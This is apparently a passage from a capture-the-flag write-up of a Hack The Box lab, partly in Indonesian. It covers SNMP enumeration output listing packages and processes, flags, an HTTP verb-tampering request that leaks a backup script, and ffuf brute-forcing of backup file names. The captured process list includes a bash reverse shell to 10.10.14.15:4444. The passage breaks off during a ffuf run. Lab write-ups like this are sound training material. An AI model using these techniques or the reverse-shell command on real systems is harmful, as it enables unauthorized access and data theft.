365                 libsodium23-1.0.16-2
366                 libsqlite3-0-3.22.0-1ubuntu0.2
367                 libss2-1.44.1-1ubuntu1.2
368                 libssl-dev-1.1.1-1ubuntu2.1~18.04.5
369                 libssl1.0.0-1.0.2n-1ubuntu5.3
370                 libssl1.1-1.1.1-1ubuntu2.1~18.04.5
371                 libstdc++6-8.3.0-6ubuntu1~18.04.1
372                 libsystemd0-237-3ubuntu10.33
373                 libtasn1-6-4.13-2   
374                 libtext-charwidth-perl-0.04-7.1
375                 libtext-iconv-perl-1.7-5build6
376                 libtext-wrapi18n-perl-0.06-7.1
377                 libtiff5-4.0.9-5ubuntu0.3
378                 libtimedate-perl-2.3000-2
379                 libtinfo5-6.1-1ubuntu1.18.04
380                 libtsan0-8.3.0-6ubuntu1~18.04.1
381                 libubsan0-7.4.0-1ubuntu1~18.04.1
382                 libudev-dev-237-3ubuntu10.33
383                 libudev1-237-3ubuntu10.33
384                 libunistring2-0.9.9-0ubuntu2
385                 libunwind8-1.2.1-8  
386                 liburi-perl-1.73-1  
387                 libusb-1.0-0-2:1.0.21-2
388                 libutempter0-1.1.6-3
389                 libuuid1-2.31.1-0.4ubuntu3.4
390                 libwebp6-0.6.1-2    
391                 libwind0-heimdal-7.5.0+dfsg-1
392                 libwrap0-7.6.q-27   
393                 libwrap0-dev-7.6.q-27
394                 libx11-6-2:1.6.4-3ubuntu0.2
395                 libx11-data-2:1.6.4-3ubuntu0.2
396                 libxau6-1:1.0.8-1   
397                 libxcb1-1.13-2~ubuntu18.04
398                 libxdmcp6-1:1.1.2-3 
399                 libxext6-2:1.3.3-1  
400                 libxml2-2.9.4+dfsg1-6.1ubuntu1.2
401                 libxmlsec1-1.2.25-1build1
402                 libxmlsec1-openssl-1.2.25-1build1
403                 libxmuu1-2:1.1.2-2  
404                 libxpm4-1:3.5.12-1  
405                 libxslt1.1-1.1.29-5ubuntu0.2
406                 libxtables12-1.6.1-2ubuntu2
407                 libyaml-0-2-0.1.7-2ubuntu3
408                 libzip4-1.1.2-1.1   
409                 libzstd1-1.3.3+dfsg-2ubuntu1.1
410                 linux-base-4.5ubuntu1
411                 linux-firmware-1.173.12
412                 linux-generic-4.15.0.72.74
413                 linux-headers-4.15.0-72-4.15.0-72.81
414                 linux-headers-4.15.0-72-generic-4.15.0-72.81
415                 linux-headers-generic-4.15.0.72.74
416                 linux-image-4.15.0-72-generic-4.15.0-72.81
417                 linux-image-generic-4.15.0.72.74
418                 linux-libc-dev-4.15.0-72.81
419                 linux-modules-4.15.0-72-generic-4.15.0-72.81
420                 linux-modules-extra-4.15.0-72-generic-4.15.0-72.81
421                 locales-2.27-3ubuntu1
422                 login-1:4.5-1ubuntu2
423                 logrotate-3.11.0-0.1ubuntu1
424                 lsb-base-9.20170808ubuntu1
425                 lsb-release-9.20170808ubuntu1
426                 lshw-02.18-0.1ubuntu6.18.04.1
427                 lsof-4.89+dfsg-0.1  
428                 ltrace-0.7.3-6ubuntu1
429                 lvm2-2.02.176-4.1ubuntu3.18.04.1
430                 lxcfs-3.0.3-0ubuntu1~18.04.1
431                 make-4.1-9.1ubuntu1 
432                 man-db-2.8.3-2ubuntu0.1
433                 manpages-4.15-1     
434                 manpages-dev-4.15-1 
435                 mawk-1.3.3-17ubuntu3
436                 mdadm-4.1~rc1-3~ubuntu18.04.2
437                 mime-support-3.60ubuntu1
438                 mlocate-0.26-2ubuntu3.1
439                 mount-2.31.1-0.4ubuntu3.4
440                 mtr-tiny-0.92-1     
441                 multiarch-support-2.27-3ubuntu1
442                 mysql-client-5.7-5.7.29-0ubuntu0.18.04.1
443                 mysql-client-core-5.7-5.7.29-0ubuntu0.18.04.1
444                 mysql-common-5.8+1.0.4
445                 mysql-server-5.7.29-0ubuntu0.18.04.1
446                 mysql-server-5.7-5.7.29-0ubuntu0.18.04.1
447                 mysql-server-core-5.7-5.7.29-0ubuntu0.18.04.1
448                 nano-2.9.3-2        
449                 ncurses-base-6.1-1ubuntu1.18.04
450                 ncurses-bin-6.1-1ubuntu1.18.04
451                 ncurses-term-6.1-1ubuntu1.18.04
452                 net-tools-1.60+git20161116.90da8a0-1ubuntu1
453                 netbase-5.4         
454                 netplan.io-0.98-0ubuntu1~18.04.1
455                 networkd-dispatcher-1.7-0ubuntu3.3
456                 nplan-0.98-0ubuntu1~18.04.1
457                 ntfs-3g-1:2017.3.23-2ubuntu0.18.04.2
458                 open-iscsi-2.0.874-5ubuntu2.7
459                 open-vm-tools-2:11.0.5-4ubuntu0.18.04.1
460                 openssh-client-1:7.6p1-4ubuntu0.3
461                 openssh-server-1:7.6p1-4ubuntu0.3
462                 openssh-sftp-server-1:7.6p1-4ubuntu0.3
463                 openssl-1.1.1-1ubuntu2.1~18.04.5
464                 os-prober-1.74ubuntu1
465                 overlayroot-0.40ubuntu1.1
466                 parted-3.2-20ubuntu0.2
467                 passwd-1:4.5-1ubuntu2
468                 pastebinit-1.5-2    
469                 patch-2.7.6-2ubuntu1.1
470                 pciutils-1:3.5.2-1ubuntu1.1
471                 perl-5.26.1-6ubuntu0.3
472                 perl-base-5.26.1-6ubuntu0.3
473                 perl-modules-5.26-5.26.1-6ubuntu0.3
474                 php-1:7.2+60ubuntu1 
475                 php-bcmath-1:7.2+60ubuntu1
476                 php-bz2-1:7.2+60ubuntu1
477                 php-common-1:60ubuntu1
478                 php-gd-1:7.2+60ubuntu1
479                 php-intl-1:7.2+60ubuntu1
480                 php-mbstring-1:7.2+60ubuntu1
481                 php-mysql-1:7.2+60ubuntu1
482                 php-zip-1:7.2+60ubuntu1
483                 php7.2-7.2.24-0ubuntu0.18.04.2
484                 php7.2-bcmath-7.2.24-0ubuntu0.18.04.2
485                 php7.2-bz2-7.2.24-0ubuntu0.18.04.2
486                 php7.2-cli-7.2.24-0ubuntu0.18.04.2
487                 php7.2-common-7.2.24-0ubuntu0.18.04.2
488                 php7.2-gd-7.2.24-0ubuntu0.18.04.2
489                 php7.2-intl-7.2.24-0ubuntu0.18.04.2
490                 php7.2-json-7.2.24-0ubuntu0.18.04.2
491                 php7.2-mbstring-7.2.24-0ubuntu0.18.04.2
492                 php7.2-mysql-7.2.24-0ubuntu0.18.04.2
493                 php7.2-opcache-7.2.24-0ubuntu0.18.04.2
494                 php7.2-readline-7.2.24-0ubuntu0.18.04.2
495                 php7.2-zip-7.2.24-0ubuntu0.18.04.2
496                 pinentry-curses-1.1.0-1
497                 plymouth-0.9.3-1ubuntu7.18.04.2
498                 plymouth-theme-ubuntu-text-0.9.3-1ubuntu7.18.04.2
499                 policykit-1-0.105-20ubuntu0.18.04.5
500                 popularity-contest-1.66ubuntu1
501                 powermgmt-base-1.33 
502                 procps-2:3.3.12-3ubuntu1.2
503                 psmisc-23.1-1ubuntu0.1
504                 publicsuffix-20180223.1310-1
505                 python-2.7.15~rc1-1 
506                 python-all-2.7.15~rc1-1
507                 python-all-dev-2.7.15~rc1-1
508                 python-apt-common-1.6.4
509                 python-asn1crypto-0.24.0-1
510                 python-cffi-backend-1.11.5-1
511                 python-crypto-2.6.1-8ubuntu2
512                 python-cryptography-2.1.4-1ubuntu1.3
513                 python-dbus-1.2.6-1 
514                 python-dev-2.7.15~rc1-1
515                 python-enum34-1.1.6-2
516                 python-gi-3.26.1-2ubuntu1
517                 python-idna-2.6-1   
518                 python-ipaddress-1.0.17-1
519                 python-keyring-10.6.0-1
520                 python-keyrings.alt-3.0-1
521                 python-minimal-2.7.15~rc1-1
522                 python-pip-9.0.1-2.3~ubuntu1.18.04.1
523                 python-pip-whl-9.0.1-2.3~ubuntu1.18.04.1
524                 python-pkg-resources-39.0.1-2
525                 python-secretstorage-2.3.1-2
526                 python-setuptools-39.0.1-2
527                 python-six-1.11.0-2 
528                 python-wheel-0.30.0-0.2
529                 python-xdg-0.25-4ubuntu1
530                 python2.7-2.7.15-4ubuntu4~18.04.2
531                 python2.7-dev-2.7.15-4ubuntu4~18.04.2
532                 python2.7-minimal-2.7.15-4ubuntu4~18.04.2
533                 python3-3.6.7-1~18.04
534                 python3-apport-2.20.9-0ubuntu7.9
535                 python3-apt-1.6.4   
536                 python3-asn1crypto-0.24.0-1
537                 python3-attr-17.4.0-2
538                 python3-automat-0.6.0-1
539                 python3-blinker-1.4+dfsg1-0.1
540                 python3-certifi-2018.1.18-2
541                 python3-cffi-backend-1.11.5-1
542                 python3-chardet-3.0.4-1
543                 python3-click-6.7-3 
544                 python3-colorama-0.3.7-1
545                 python3-commandnotfound-18.04.5
546                 python3-configobj-5.0.6-2
547                 python3-constantly-15.1.0-1
548                 python3-cryptography-2.1.4-1ubuntu1.3
549                 python3-dbus-1.2.6-1
550                 python3-debconf-1.5.66ubuntu1
551                 python3-debian-0.1.32
552                 python3-distro-info-0.18ubuntu0.18.04.1
553                 python3-distupgrade-1:18.04.36
554                 python3-flask-0.12.2-3
555                 python3-gdbm-3.6.9-1~18.04
556                 python3-gi-3.26.1-2ubuntu1
557                 python3-httplib2-0.9.2+dfsg-1ubuntu0.1
558                 python3-hyperlink-17.3.1-2
559                 python3-idna-2.6-1  
560                 python3-incremental-16.10.1-3
561                 python3-itsdangerous-0.24+dfsg1-2
562                 python3-jinja2-2.10-1ubuntu0.18.04.1
563                 python3-json-pointer-1.10-1
564                 python3-jsonpatch-1.19+really1.16-1fakesync1
565                 python3-jsonschema-2.6.0-2
566                 python3-jwt-1.5.3+ds1-1
567                 python3-markupsafe-1.0-1build1
568                 python3-minimal-3.6.7-1~18.04
569                 python3-netifaces-0.10.4-0.1build4
570                 python3-newt-0.52.20-1ubuntu1
571                 python3-oauthlib-2.0.6-1
572                 python3-openssl-17.5.0-1ubuntu1
573                 python3-pam-0.4.2-13.2ubuntu4
574                 python3-pkg-resources-39.0.1-2
575                 python3-problem-report-2.20.9-0ubuntu7.9
576                 python3-pyasn1-0.4.2-3
577                 python3-pyasn1-modules-0.2.1-0.2
578                 python3-pyinotify-0.9.6-1
579                 python3-requests-2.18.4-2ubuntu0.1
580                 python3-requests-unixsocket-0.1.5-3
581                 python3-serial-3.4-2
582                 python3-service-identity-16.0.0-2
583                 python3-simplejson-3.13.2-1
584                 python3-six-1.11.0-2
585                 python3-software-properties-0.96.24.32.11
586                 python3-systemd-234-1build1
587                 python3-twisted-17.9.0-2
588                 python3-twisted-bin-17.9.0-2
589                 python3-update-manager-1:18.04.11.10
590                 python3-urllib3-1.22-1ubuntu0.18.04.1
591                 python3-werkzeug-0.14.1+dfsg1-1
592                 python3-yaml-3.12-1build2
593                 python3-zope.interface-4.3.2-1build2
594                 python3.6-3.6.9-1~18.04
595                 python3.6-minimal-3.6.9-1~18.04
596                 readline-common-7.0-3
597                 rsync-3.1.2-2.1ubuntu1
598                 rsyslog-8.32.0-1ubuntu4
599                 run-one-1.17-0ubuntu1
600                 screen-4.6.2-1ubuntu1
601                 sed-4.4-2           
602                 sensible-utils-0.0.12
603                 shared-mime-info-1.9-2
604                 snapd-2.42.1+18.04  
605                 snmp-5.7.3+dfsg-1.8ubuntu3.3
606                 snmpd-5.7.3+dfsg-1.8ubuntu3.3
607                 software-properties-common-0.96.24.32.11
608                 sosreport-3.6-1ubuntu0.18.04.4
609                 squashfs-tools-1:4.3-6ubuntu0.18.04.1
610                 ssh-import-id-5.7-0ubuntu1.1
611                 ssl-cert-1.0.39     
612                 strace-4.21-1ubuntu1
613                 sudo-1.8.21p2-3ubuntu1
614                 systemd-237-3ubuntu10.33
615                 systemd-sysv-237-3ubuntu10.33
616                 sysvinit-utils-2.88dsf-59.10ubuntu1
617                 tar-1.29b-2ubuntu0.1
618                 tcpdump-4.9.2-3     
619                 telnet-0.17-41      
620                 thermald-1.7.0-5ubuntu5
621                 time-1.7-25.1build1 
622                 tmux-2.6-3ubuntu0.2 
623                 tzdata-2019c-0ubuntu0.18.04
624                 ubuntu-advantage-tools-17
625                 ubuntu-keyring-2018.09.18.1~18.04.0
626                 ubuntu-release-upgrader-core-1:18.04.36
627                 ubuntu-standard-1.417.3
628                 ucf-3.0038          
629                 udev-237-3ubuntu10.33
630                 ufw-0.36-0ubuntu0.18.04.1
631                 unattended-upgrades-1.1ubuntu1.18.04.13
632                 unzip-6.0-21ubuntu1 
633                 update-manager-core-1:18.04.11.10
634                 update-notifier-common-3.192.1.7
635                 ureadahead-0.100.0-21
636                 usbutils-1:007-4build1
637                 util-linux-2.31.1-0.4ubuntu3.4
638                 uuid-runtime-2.31.1-0.4ubuntu3.4
639                 vim-2:8.0.1453-1ubuntu1.1
640                 vim-common-2:8.0.1453-1ubuntu1.1
641                 vim-runtime-2:8.0.1453-1ubuntu1.1
642                 vim-tiny-2:8.0.1453-1ubuntu1.1
643                 wget-1.19.4-1ubuntu2.2
644                 whiptail-0.52.20-1ubuntu1
645                 wireless-regdb-2018.05.09-0ubuntu1~18.04.1
646                 xauth-1:1.0.10-1    
647                 xdg-user-dirs-0.17-1ubuntu1
648                 xfsprogs-4.9.0+nmu1ubuntu2
649                 xkb-data-2.23.1-1ubuntu1.18.04.1
650                 xxd-2:8.0.1453-1ubuntu1.1
651                 xz-utils-5.2.2-1.3  
652                 zerofree-1.0.4-1    
653                 zip-3.0-11build1    
654                 zlib1g-1:1.2.11.dfsg-0ubuntu2
655                 zlib1g-dev-1:1.2.11.dfsg-0ubuntu2

[*] Processes:

Id                  Status              Name                Path                Parameters          
1                   runnable            systemd             /sbin/init          maybe-ubiquity      
2                   runnable            kthreadd                                                    
4                   unknown             kworker/0:0H                                                
6                   unknown             mm_percpu_wq                                                
7                   runnable            ksoftirqd/0                                                 
8                   unknown             rcu_sched                                                   
9                   unknown             rcu_bh                                                      
10                  runnable            migration/0                                                 
11                  runnable            watchdog/0                                                  
12                  runnable            cpuhp/0                                                     
13                  runnable            cpuhp/1                                                     
14                  runnable            watchdog/1                                                  
15                  runnable            migration/1                                                 
16                  runnable            ksoftirqd/1                                                 
18                  unknown             kworker/1:0H                                                
19                  runnable            kdevtmpfs                                                   
20                  unknown             netns                                                       
21                  runnable            rcu_tasks_kthre                                             
22                  runnable            kauditd                                                     
24                  runnable            khungtaskd                                                  
25                  runnable            oom_reaper                                                  
26                  unknown             writeback                                                   
27                  runnable            kcompactd0                                                  
28                  runnable            ksmd                                                        
29                  runnable            khugepaged                                                  
30                  unknown             crypto                                                      
31                  unknown             kintegrityd                                                 
32                  unknown             kblockd                                                     
33                  unknown             ata_sff                                                     
34                  unknown             md                                                          
35                  unknown             edac-poller                                                 
36                  unknown             devfreq_wq                                                  
37                  unknown             watchdogd                                                   
41                  runnable            kswapd0                                                     
42                  unknown             kworker/u5:0                                                
43                  runnable            ecryptfs-kthrea                                             
85                  unknown             kthrotld                                                    
86                  unknown             acpi_thermal_pm                                             
87                  runnable            scsi_eh_0                                                   
88                  unknown             scsi_tmf_0                                                  
89                  runnable            scsi_eh_1                                                   
90                  unknown             scsi_tmf_1                                                  
96                  unknown             ipv6_addrconf                                               
105                 unknown             kstrp                                                       
122                 unknown             charger_manager                                             
173                 runnable            scsi_eh_2                                                   
174                 unknown             scsi_tmf_2                                                  
175                 runnable            scsi_eh_3                                                   
176                 unknown             scsi_tmf_3                                                  
177                 unknown             ttm_swap                                                    
178                 runnable            irq/16-vmwgfx                                               
179                 runnable            scsi_eh_4                                                   
186                 unknown             scsi_tmf_4                                                  
187                 runnable            scsi_eh_5                                                   
190                 unknown             scsi_tmf_5                                                  
191                 runnable            scsi_eh_6                                                   
192                 unknown             scsi_tmf_6                                                  
193                 runnable            scsi_eh_7                                                   
194                 unknown             scsi_tmf_7                                                  
195                 runnable            scsi_eh_8                                                   
196                 unknown             scsi_tmf_8                                                  
197                 runnable            scsi_eh_9                                                   
198                 unknown             scsi_tmf_9                                                  
199                 runnable            scsi_eh_10                                                  
200                 unknown             scsi_tmf_10                                                 
201                 runnable            scsi_eh_11                                                  
202                 unknown             scsi_tmf_11                                                 
203                 runnable            scsi_eh_12                                                  
204                 unknown             scsi_tmf_12                                                 
205                 runnable            scsi_eh_13                                                  
206                 unknown             scsi_tmf_13                                                 
207                 runnable            scsi_eh_14                                                  
208                 unknown             scsi_tmf_14                                                 
209                 runnable            scsi_eh_15                                                  
210                 unknown             scsi_tmf_15                                                 
211                 runnable            scsi_eh_16                                                  
213                 unknown             scsi_tmf_16                                                 
214                 runnable            scsi_eh_17                                                  
215                 unknown             scsi_tmf_17                                                 
216                 runnable            scsi_eh_18                                                  
217                 unknown             scsi_tmf_18                                                 
218                 runnable            scsi_eh_19                                                  
219                 unknown             scsi_tmf_19                                                 
235                 runnable            scsi_eh_20                                                  
237                 unknown             scsi_tmf_20                                                 
238                 runnable            scsi_eh_21                                                  
240                 unknown             scsi_tmf_21                                                 
241                 runnable            scsi_eh_22                                                  
242                 unknown             scsi_tmf_22                                                 
243                 runnable            scsi_eh_23                                                  
244                 unknown             scsi_tmf_23                                                 
245                 runnable            scsi_eh_24                                                  
247                 unknown             scsi_tmf_24                                                 
248                 runnable            scsi_eh_25                                                  
249                 unknown             scsi_tmf_25                                                 
250                 runnable            scsi_eh_26                                                  
251                 unknown             scsi_tmf_26                                                 
252                 runnable            scsi_eh_27                                                  
253                 unknown             scsi_tmf_27                                                 
255                 runnable            scsi_eh_28                                                  
256                 unknown             scsi_tmf_28                                                 
257                 runnable            scsi_eh_29                                                  
258                 unknown             scsi_tmf_29                                                 
259                 runnable            scsi_eh_30                                                  
260                 unknown             scsi_tmf_30                                                 
263                 runnable            scsi_eh_31                                                  
264                 unknown             scsi_tmf_31                                                 
301                 unknown             kworker/0:1H                                                
302                 unknown             kworker/1:1H                                                
372                 unknown             raid5wq                                                     
419                 runnable            jbd2/sda2-8                                                 
420                 unknown             ext4-rsv-conver                                             
487                 runnable            systemd-journal     /lib/systemd/systemd-journald                    
492                 unknown             iscsi_eh                                                    
493                 unknown             ib-comp-wq                                                  
494                 unknown             ib-comp-unb-wq                                              
495                 unknown             ib_mcast                                                    
496                 unknown             ib_nl_sa_wq                                                 
497                 unknown             rdma_cm                                                     
507                 runnable            systemd-udevd       /lib/systemd/systemd-udevd                    
517                 runnable            lvmetad             /sbin/lvmetad       -f                  
539                 runnable            loop0                                                       
544                 runnable            loop1                                                       
547                 runnable            systemd-timesyn     /lib/systemd/systemd-timesyncd                    
696                 runnable            VGAuthService       /usr/bin/VGAuthService                    
697                 runnable            vmtoolsd            /usr/bin/vmtoolsd                       
833                 runnable            systemd-network     /lib/systemd/systemd-networkd                    
857                 runnable            systemd-resolve     /lib/systemd/systemd-resolved                    
914                 runnable            dbus-daemon         /usr/bin/dbus-daemon--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
919                 runnable            irqbalance          /usr/sbin/irqbalance--foreground        
920                 runnable            systemd-logind      /lib/systemd/systemd-logind                    
923                 runnable            accounts-daemon     /usr/lib/accountsservice/accounts-daemon                    
926                 runnable            networkd-dispat     /usr/bin/python3    /usr/bin/networkd-dispatcher --run-startup-triggers
934                 runnable            rsyslogd            /usr/sbin/rsyslogd  -n                  
936                 runnable            atd                 /usr/sbin/atd       -f                  
944                 runnable            cron                /usr/sbin/cron      -f                  
945                 runnable            snapd               /usr/lib/snapd/snapd                    
946                 running             snmpd               /usr/sbin/snmpd     -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
973                 runnable            unattended-upgr     /usr/bin/python3    /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
999                 runnable            agetty              /sbin/agetty        -o -p -- \u --noclear tty1 linux
1013                runnable            sshd                /usr/sbin/sshd      -D                  
1014                runnable            polkitd             /usr/lib/policykit-1/polkitd--no-debug          
1020                runnable            apache2             /usr/sbin/apache2   -k start            
1023                runnable            mysqld              /usr/sbin/mysqld    --daemonize --pid-file=/run/mysqld/mysqld.pid
1227                runnable            cron                /usr/sbin/CRON      -f                  
1228                runnable            cron                /usr/sbin/CRON      -f                  
1229                runnable            sh                  /bin/sh             -c /opt/check_backup.sh
1230                runnable            sh                  /bin/sh             -c /opt/check_devSite.sh
1231                runnable            check_backup.sh     /bin/bash           /opt/check_backup.sh
1232                runnable            check_devSite.s     /bin/bash           /opt/check_devSite.sh
1235                runnable            space_dev.py        /usr/bin/python     /var/www/html/dev/space_dev.py
1236                runnable            backup_every_17     /bin/bash           /var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
1241                runnable            python              /usr/bin/python     /var/www/html/dev/space_dev.py
1243                runnable            uuidd               /usr/sbin/uuidd     --socket-activation 
12765               unknown             kworker/0:0                                                 
13579               unknown             kworker/1:0                                                 
13668               runnable            sh                  sh                  -c bash -c "bash -i >& /dev/tcp/10.10.14.15/4444 0>&1"
13669               runnable            bash                bash                -c bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
13670               runnable            bash                bash                -i                  
13925               runnable            sudo                sudo                -S                  
13926               runnable            sh                  sh                                      
13935               runnable            python              python              -c import pty;pty.spawn('/bin/bash')
13936               runnable            bash                /bin/bash                               
16596               runnable            sh                  sh                                      
16695               runnable            sh                  sh                                      
16736               runnable            sudo                sudo                -S                  
16737               runnable            sh                  sh                                      
16942               runnable            sh                  sh                                      
16943               runnable            sudo                sudo                -S                  
16944               runnable            sh                  sh                                      
16947               runnable            sh                  sh                                      
16948               runnable            sudo                sudo                -S                  
16949               runnable            sh                  sh                                      
28160               unknown             kworker/1:2                                                 
30338               unknown             kworker/u4:0                                                
30427               unknown             kworker/0:2                                                 
30788               runnable            sh                  /bin/sh             -i                  
30799               runnable            python3             python3             -c import pty; pty.spawn("/bin/bash")
30800               runnable            bash                /bin/bash                               
30807               unknown             kworker/u4:1                                                
30867               runnable            apache2             /usr/sbin/apache2   -k start            
30918               runnable            sudo                sudo                -S                  
30919               runnable            sh                  sh                                      
30922               runnable            apache2             /usr/sbin/apache2   -k start            
30952               runnable            apache2             /usr/sbin/apache2   -k start            
31021               runnable            apache2             /usr/sbin/apache2   -k start            
31023               runnable            apache2             /usr/sbin/apache2   -k start            
31029               runnable            apache2             /usr/sbin/apache2   -k start            
31069               runnable            apache2             /usr/sbin/apache2   -k start            
31070               runnable            apache2             /usr/sbin/apache2   -k start            
31072               runnable            apache2             /usr/sbin/apache2   -k start            
31073               runnable            apache2             /usr/sbin/apache2   -k start            
31076               runnable            apache2             /usr/sbin/apache2   -k start            
31080               runnable            apache2             /usr/sbin/apache2   -k start            
31081               runnable            apache2             /usr/sbin/apache2   -k start            
31082               runnable            apache2             /usr/sbin/apache2   -k start            
31083               unknown             apache2                                                     
31084               runnable            apache2             /usr/sbin/apache2   -k start            
31085               runnable            apache2             /usr/sbin/apache2   -k start            
31086               runnable            apache2             /usr/sbin/apache2   -k start            
31088               runnable            apache2             /usr/sbin/apache2   -k start            
31089               runnable            apache2             /usr/sbin/apache2   -k start            
31090               runnable            apache2             /usr/sbin/apache2   -k start            
31093               runnable            apache2             /usr/sbin/apache2   -k start            
31108               runnable            apache2             /usr/sbin/apache2   -k start            
31109               runnable            apache2             /usr/sbin/apache2   -k start            
31110               runnable            apache2             /usr/sbin/apache2   -k start            
31129               runnable            apache2             /usr/sbin/apache2   -k start            
31131               runnable            apache2             /usr/sbin/apache2   -k start            
31132               runnable            apache2             /usr/sbin/apache2   -k start            
31136               runnable            apache2             /usr/sbin/apache2   -k start            
31137               runnable            apache2             /usr/sbin/apache2   -k start            
31140               runnable            apache2             /usr/sbin/apache2   -k start            
31141               runnable            apache2             /usr/sbin/apache2   -k start            
31142               runnable            apache2             /usr/sbin/apache2   -k start            
31143               runnable            apache2             /usr/sbin/apache2   -k start            
31145               runnable            apache2             /usr/sbin/apache2   -k start            
31148               runnable            apache2             /usr/sbin/apache2   -k start            
31150               runnable            apache2             /usr/sbin/apache2   -k start            
31151               runnable            apache2             /usr/sbin/apache2   -k start            
31152               runnable            apache2             /usr/sbin/apache2   -k start            
31153               runnable            apache2             /usr/sbin/apache2   -k start            
31154               runnable            apache2             /usr/sbin/apache2   -k start            
31157               runnable            apache2             /usr/sbin/apache2   -k start            
31158               runnable            apache2             /usr/sbin/apache2   -k start            
31159               runnable            apache2             /usr/sbin/apache2   -k start            
31162               runnable            apache2             /usr/sbin/apache2   -k start            
31165               runnable            apache2             /usr/sbin/apache2   -k start            
31166               runnable            apache2             /usr/sbin/apache2   -k start            
31167               runnable            apache2             /usr/sbin/apache2   -k start            
31168               runnable            apache2             /usr/sbin/apache2   -k start            
31169               runnable            apache2             /usr/sbin/apache2   -k start            
31184               runnable            apache2             /usr/sbin/apache2   -k start            
31185               runnable            apache2             /usr/sbin/apache2   -k start            
31187               runnable            apache2             /usr/sbin/apache2   -k start            
31188               runnable            apache2             /usr/sbin/apache2   -k start            
31190               runnable            apache2             /usr/sbin/apache2   -k start            
31203               runnable            sleep               sleep               1020                
31212               runnable            apache2             /usr/sbin/apache2   -k start            
31213               runnable            apache2             /usr/sbin/apache2   -k start            
31216               runnable            apache2             /usr/sbin/apache2   -k start            
31217               runnable            apache2             /usr/sbin/apache2   -k start            
31219               runnable            apache2             /usr/sbin/apache2   -k start            
31220               runnable            apache2             /usr/sbin/apache2   -k start            
31221               runnable            apache2             /usr/sbin/apache2   -k start            
31224               runnable            apache2             /usr/sbin/apache2   -k start            
31231               runnable            apache2             /usr/sbin/apache2   -k start            
31232               runnable            apache2             /usr/sbin/apache2   -k start            
31233               runnable            apache2             /usr/sbin/apache2   -k start            
31237               runnable            apache2             /usr/sbin/apache2   -k start            
31238               runnable            apache2             /usr/sbin/apache2   -k start            
31240               runnable            apache2             /usr/sbin/apache2   -k start            
31242               runnable            apache2             /usr/sbin/apache2   -k start            
31247               runnable            apache2             /usr/sbin/apache2   -k start            
31248               runnable            apache2             /usr/sbin/apache2   -k start            
31249               runnable            apache2             /usr/sbin/apache2   -k start            
31251               runnable            apache2             /usr/sbin/apache2   -k start            
31254               runnable            apache2             /usr/sbin/apache2   -k start            
31255               runnable            apache2             /usr/sbin/apache2   -k start            
31258               runnable            apache2             /usr/sbin/apache2   -k start            
31267               unknown             kworker/u4:2                                                
31268               runnable            apache2             /usr/sbin/apache2   -k start            
31269               runnable            apache2             /usr/sbin/apache2   -k start            
31270               runnable            apache2             /usr/sbin/apache2   -k start            
31272               runnable            apache2             /usr/sbin/apache2   -k start            
31273               runnable            apache2             /usr/sbin/apache2   -k start            
31274               runnable            apache2             /usr/sbin/apache2   -k start            
31275               runnable            apache2             /usr/sbin/apache2   -k start            
31276               runnable            apache2             /usr/sbin/apache2   -k start            
31277               runnable            apache2             /usr/sbin/apache2   -k start            
31278               runnable            apache2             /usr/sbin/apache2   -k start            
31282               runnable            apache2             /usr/sbin/apache2   -k start            
31284               runnable            apache2             /usr/sbin/apache2   -k start            
31287               runnable            apache2             /usr/sbin/apache2   -k start            
31288               runnable            apache2             /usr/sbin/apache2   -k start            
31289               runnable            apache2             /usr/sbin/apache2   -k start            
31290               runnable            apache2             /usr/sbin/apache2   -k start            
31291               runnable            apache2             /usr/sbin/apache2   -k start            
31292               runnable            apache2             /usr/sbin/apache2   -k start            
31293               runnable            apache2             /usr/sbin/apache2   -k start            


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_enum) >> 


```


# Flag 3 
┌─[us-fort-1]─[10.10.14.12]─[aexon101@htb-uobaimexqc]─[~]
└──╼ [★]$ curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh

```bash
#!/bin/bash

This script performs backups of production and development websites.
Backups are done every 17 minutes.

AKERVA{IKNoW###VeRbTamper!nG_==}


SAVE_DIR=/var/www/html/backups

while true
do
	ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
	echo "Erasing old backups..."
	rm -rf $SAVE_DIR/*

	echo "Backuping..."
	zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

	echo "Done..."
	sleep 1020
done
```


di sini kita tau bahwa format backup nya adalah: `backup_YYYYMMDDHHMMSS.zip`

contoh
`backup_20240620123456.zip`
mari kita lakukan brute force waktu nya

```bash
ffuf -w wordlist -u http://ip/backups/backup_20240620{FUZZ}.zip
```


```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $curl -I http://10.13.37.11 | grep Date
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:20 --:--:--     0
Date: Thu, 20 Jun 2024 07:20:35 GMT
```

# DIR port 5000

#### ffuf Scan Report

##### Summary:
- **Tool:** ffuf v2.1.0-dev
- **Method:** GET
- **URL:** http://10.13.37.11:5000/FUZZ
- **Wordlist:** /home/aexon/tools/wordlist/medium
- **Extensions:** .php
- **Follow Redirects:** false
- **Calibration:** false
- **Timeout:** 10 seconds
- **Threads:** 40
- **Matcher:** Response status: 200-299,301,302,307,401,403,405,500

## Results:
- `file.php` [Status: 401, Size: 19 bytes, Words: 2, Lines: 1, Duration: 2867ms]


# Flag 4

```bash
┌─[aexon@parrot]─[~]
└──╼ $ffuf -w tools/wordlist/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://10.13.37.11/backups/backup_2024062009FUZZ.zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.37.11/backups/backup_2024062009FUZZ.zip
